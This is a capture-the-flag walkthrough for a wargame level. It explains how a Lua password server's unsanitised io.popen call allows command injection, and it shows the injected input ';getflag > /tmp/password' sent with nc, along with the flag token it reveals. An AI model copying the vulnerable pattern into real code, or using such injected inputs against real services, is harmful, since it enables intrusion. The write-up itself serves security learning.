# Level 11

As `level11`, running `ls` gives us a lua script...

```lua
  $> cat level11.lua

  #!/usr/bin/env lua
  local socket = require("socket")
  local server = assert(socket.bind("127.0.0.1", 5151))

  function hash(pass)
    prog = io.popen("echo "..pass.." | sha1sum", "r")  
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
  end


  while 1 do
    local client = server:accept()
    client:send("Password: ")
    client:settimeout(60)
    local l, err = client:receive()
    if not err then
        print("trying " .. l)
        local h = hash(l)

        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
            client:send("Erf nope..\n");
        else
            client:send("Gz you dumb*\n")
        end

    end

    client:close()
  end
```

> This script create a socket server on port `5151` that requests an input from the client before processing it to display one message.

The interesting part is the following line:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")  
```

Since it evaluates the `pass` variable, which is our input, we can perform the same trick as in previous levels: escape the `echo` to call `getflag`.

```shell
  $> nc 127.0.0.1 5151
  Password: ;getflag > /tmp/password
  Erf nope..
  $> cat /tmp/password
  Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

So, `fa6v5ateaw21peobuub8ipe6s` is the flag for this level.


